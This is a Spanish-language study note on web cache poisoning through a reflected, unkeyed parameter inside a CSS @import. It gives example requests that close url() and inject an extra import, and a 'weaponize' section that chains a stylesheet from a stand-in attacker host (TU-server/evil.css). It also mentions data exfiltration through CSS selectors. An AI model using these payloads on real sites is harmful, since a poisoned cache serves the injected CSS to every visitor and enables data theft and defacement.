---
aliases:
  - WCP 011 - dynamic content in resource imports
  - CSS @import injection cache
tags:
  - vuln/web-cache-poisoning
  - example
  - portswigger
---

# 011 — Contenido dinámico en imports de recursos (CSS `@import`)

> Técnica → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]] · combina con [[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009 (cloaking)]]

## Qué muestra
No solo el HTML es dinámico: **los recursos también** (CSS, JS) pueden **reflejar parámetros**. Si un `.css` refleja un `excluded_param` dentro de un `@import url(...)`, cerrás el `url(...)` e **inyectás tu propio `@import`** (o CSS malicioso). Como el recurso se **cachea**, tu inyección la reciben todos.

## Cómo se ve

**Inyectar un `@import` extra:**
> `GET /style.css?excluded_param=`==`123);@import…`==` HTTP/1.1`

**⬇️ se incrusta en el `@import url(...)` del CSS:**
> `@import url(/site/home/index.part1.8a6715a2.css?excluded_param=`==`123);@import…`==

El `123)` **cierra el `url(...)`** y el `;@import…` **agrega tu import**.

**Inyectar CSS directo** (y ver dónde cae):
> `GET /style.css?excluded_param=`==`alert(1)%0A{}*{color:red;}`==` HTTP/1.1`

**⬇️ el WAF refleja el input en el bloqueo** (señal de que controlás contenido reflejado):
> `HTTP/1.1 200 OK` · `Content-Type: text/html`
> `This request was blocked due to…`==`alert(1){}*{color:red;}`==

## Por qué funciona
- El parámetro (`excluded_param`) es **unkeyed** pero **se refleja** dentro del recurso → mismo principio que el HTML, pero en **CSS**.
- Cerrando el `url(...)` con `)` y sumando `;@import url(//tu-server/evil.css)` **encadenás tu hoja de estilos** → CSS injection persistida por caché (exfil de datos con selectores, defacement, o pivot a XSS según el contexto).
- `Content-Type: text/html` en el segundo caso es un olor a **confusión de tipos** aprovechable.

## Cómo explotarlo (weaponize)
1. Detectá el reflejo del param dentro del `@import url(...)`.
2. Cerrá el `url()` con `)` e inyectá `;@import url(//TU-server/evil.css)`.
3. Cacheá el recurso → todo el que cargue la página aplica tu CSS.

## Detalles que se pasan por alto
- El vehículo cambia (CSS en vez de `<script>`), pero la **lógica es idéntica**: input unkeyed reflejado + caché.
- El **WAF que refleja el bloqueo** es información: te confirma reflejo y te deja iterar el bypass.
- Combinable con **cloaking** ([[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009]]) si el `excluded_param` está fuera de la key.
